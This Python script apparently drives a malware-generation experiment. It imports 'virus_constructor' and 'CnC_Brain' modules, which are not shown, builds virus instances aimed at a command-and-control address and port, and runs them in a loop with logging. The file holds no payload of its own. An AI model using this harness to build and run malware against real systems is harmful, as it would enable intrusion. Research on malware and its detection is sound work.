#!/usr/bin/env python3
import os
import threading, logging, time
import virus_constructor as vc
import CnC_Brain as cc

def experiment():
    x = vc.wrapper("175.20.0.200", "8080")
    cc.originality_check(x)
    # os.system('python3 /root/mount/CnC_Brain.py')

def thread_function(name):
    logging.info("Thread %s: starting", name)
    time.sleep(2)
    logging.info("Thread %s: finishing", name)

if __name__ == "__main__":
    from sys import argv
    
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(filename='experiment.log', format=format, level=logging.INFO,
                        datefmt="%H:%M:%S")

    logging.info("Main    : before creating thread")
    x = threading.Thread(target=thread_function, args=(1,))
    logging.info("Main    : before running thread")
    x.start()
    logging.info("Main    : wait for the thread to finish")
    # x.join()
    logging.info("Main    : all done")

    if len(argv) == 2:
        for i in range(0, int(argv[1])):
            # x = threading.Thread(target=experiment, args=(1,), daemon=True)
            experiment()
            # x.start()
    else:
        experiment()